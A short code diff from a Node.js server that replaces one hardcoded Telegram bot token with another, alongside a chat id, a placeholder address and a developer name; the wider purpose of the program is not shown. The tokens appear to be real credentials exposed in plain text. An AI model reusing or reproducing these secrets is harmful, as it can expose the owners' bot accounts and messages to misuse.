@@ -7,7 +7,7 @@ const multer = require('multer');
 const bodyParser = require('body-parser');
 const axios = require("axios");
 
-const token = '6839474973:AAH5bm5EJtNGPOa7-oTreJ4NxcBrIuSQ3nw';
+const token = '8570646406:AAG492SHIAdZfrdhnn8R6-BGjTQLV_tqzTw';
 const id = '6541663008';
 const address = 'https://www.google.com';
 const DEVELOPER_NAME = "𝘾𝙮𝙗𝙚𝙧 𝙆𝙪𝙖𝙨𝙝𝙖";
